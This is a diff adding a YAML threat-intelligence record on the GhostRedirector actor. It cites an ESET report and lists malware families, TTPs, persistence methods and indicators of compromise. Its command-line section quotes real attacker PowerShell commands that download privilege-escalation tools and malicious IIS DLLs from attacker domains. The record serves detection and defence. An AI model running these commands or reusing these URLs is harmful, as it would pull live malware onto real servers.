@@ -1,0 +1,94 @@
+description: "GhostRedirector is a China\u2011aligned threat actor that compromises\
+  \ Windows servers, deploys a malicious IIS module (Gamshen) for SEO poisoning, and\
+  \ creates rogue user accounts to maintain persistence."
+attribution: GhostRedirector, China-aligned
+malware_families:
+- Rungan
+- Gamshen
+- EfsPotato
+- BadPotato
+- Zunput
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell
+  - sqlserver.exe
+  commandline:
+  - cmd.exe /d /s /c "powershell curl https://xzs.868id.com/EfsNetAutoUser_br.exe
+    -OutFile C:\\ProgramData\\EfsNetAutoUser_br.exe"
+  - cmd.exe /d /s /c "powershell curl http://xz.868id.com/EfsPotato_sign.exe -OutFile
+    C:\\ProgramData\\EfsPotato_sign.exe"
+  - cmd.exe /d /s /c "powershell curl https://xzs.868id.com/link.exe -OutFile C:\\ProgramData\\link.exe"
+  - powershell curl https://xzs.868id.com/iis/br/ManagedEngine64_v2.dll -OutFile C:\\ProgramData\\Microsoft\\DRM\\log\\ManagedEngine64.dll
+  - powershell curl https://xzs.868id.com/iis/IISAgentDLL.dll -OutFile C:\\ProgramData\\Microsoft\\DRM\\log\\miniscreen.dll
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: powershell
+    destination: https://xzs.868id.com/EfsNetAutoUser_br.exe
+    port: 443
+  - process: powershell
+    destination: http://xz.868id.com/EfsPotato_sign.exe
+    port: 80
+  - process: powershell
+    destination: https://xzs.868id.com/link.exe
+    port: 443
+  - process: powershell
+    destination: https://xzs.868id.com/iis/br/ManagedEngine64_v2.dll
+    port: 443
+  - process: powershell
+    destination: https://xzs.868id.com/iis/IISAgentDLL.dll
+    port: 443
+  file_activity:
+  - C:\\ProgramData\\EfsNetAutoUser_br.exe
+  - C:\\ProgramData\\EfsPotato_sign.exe
+  - C:\\ProgramData\\link.exe
+  - C:\\ProgramData\\Microsoft\\DRM\\log\\ManagedEngine64.dll
+  - C:\\ProgramData\\Microsoft\\DRM\\log\\miniscreen.dll
+  persistence:
+  - Create privileged user via EfsPotato/BadPotato exploits
+  - Add user to Administrators group
+  process_relations: []
+IOCs:
+  hashes:
+  - EE22BA5453ED577F8664CA390EB311D067E47786
+  - 677B3F9D780BE184528D
+  - 5D4D7C96A9E302053BDF
+  - EE22BA5453ED577F8664
+  - 28140A5A29EBA098BC62
+  - 371818BDC20669DF3CA4
+  - 9DD282184DDFA796204C
+  - 87F354EAA1A6ED5AE51C
+  - 5A01981D3F31AF47614E
+  - 6EBD7498FC3B744CED37
+  - 0EE926E29874324E52DE
+  - 08AB5CC8618FA593D2DF
+  - 871A4DF66A8BAC3E640B
+  - 049C343A9DAAF3A93756
+  domains:
+  - 868id.com
+  - brproxy.868id.com
+  - gobr.868id.com
+  - www.cs01.shop
+  - xzs.868id.com
+  - xz.868id.com
+  - q.822th.com
+  - www.881vn.com
+  urls:
+  - https://xzs.868id.com/EfsNetAutoUser_br.exe
+  - http://xz.868id.com/EfsPotato_sign.exe
+  - https://xzs.868id.com/link.exe
+  - https://xzs.868id.com/iis/br/ManagedEngine64_v2.dll
+  - https://xzs.868id.com/iis/IISAgentDLL.dll
+  ips:
+  - 104.233.192.1
+  - 104.233.210.229
+  - 43.228.126.4
+  - 103.251.112.11
+authors:
+- Fernando Tavella
+reference: https://www.welivesecurity.com/en/eset-research/ghostredirector-poisons-windows-servers-backdoors-side-potatoes
+date_of_publication: September 04, 2025
+file_creation_date: October 01, 2025
